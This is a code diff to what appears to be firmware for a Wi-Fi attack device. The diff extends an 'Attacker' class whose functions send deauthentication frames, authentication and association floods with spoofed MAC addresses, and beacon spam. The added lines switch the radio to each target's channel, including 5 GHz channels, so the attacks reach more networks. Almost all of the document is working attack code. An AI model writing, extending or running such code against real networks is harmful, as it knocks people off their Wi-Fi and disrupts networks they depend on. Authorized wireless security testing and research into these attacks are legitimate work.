@@ -6,6 +6,7 @@
 
 extern "C" {
     int wifi_tx_raw_frame(void* frame, int len);
+    int wifi_change_channel(int channel);
 }
 
 static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
@@ -107,6 +108,10 @@ void Attacker::_tickDeauth() {
     if (_targetIdx >= _targetCount) _targetIdx = 0;
     AttackTarget& t = _targets[_targetIdx++];
 
+    // Switch radio to target channel (required for 5GHz targets)
+    const Network* tnet = Scan.networkByBSSID(t.bssid);
+    if (tnet && tnet->channel > 0) wifi_change_channel(tnet->channel);
+
     uint8_t buf[64];
     const uint8_t* da = (_mode == ATK_DEAUTH_BCAST ||
                          memcmp(t.client, "\0\0\0\0\0\0", 6) == 0)
@@ -132,6 +137,9 @@ void Attacker::_tickAuthFlood() {
     if (_targetIdx >= _targetCount) _targetIdx = 0;
     AttackTarget& t = _targets[_targetIdx++];
 
+    const Network* tnet = Scan.networkByBSSID(t.bssid);
+    if (tnet && tnet->channel > 0) wifi_change_channel(tnet->channel);
+
     uint8_t buf[64];
     for (uint8_t i = 0; i < _frames; i++) {
         uint8_t spoofed[6];
@@ -147,8 +155,9 @@ void Attacker::_tickAssocFlood() {
     if (_targetIdx >= _targetCount) _targetIdx = 0;
     AttackTarget& t = _targets[_targetIdx++];
 
-    // Find SSID for this BSSID
+    // Find SSID for this BSSID and switch to target channel
     const Network* net = Scan.networkByBSSID(t.bssid);
+    if (net && net->channel > 0) wifi_change_channel(net->channel);
     const char* ssid = net ? net->ssid : "";
 
     uint8_t buf[128];
@@ -172,6 +181,8 @@ void Attacker::_tickBeaconSpam() {
 
     uint8_t bssid[6];
     FrameBuilder::randomMAC(bssid);
+
+    wifi_change_channel(_beaconChannel);
 
     uint8_t buf[128];
     int len = FrameBuilder::buildBeacon(buf, bssid, ssid, _beaconChannel);
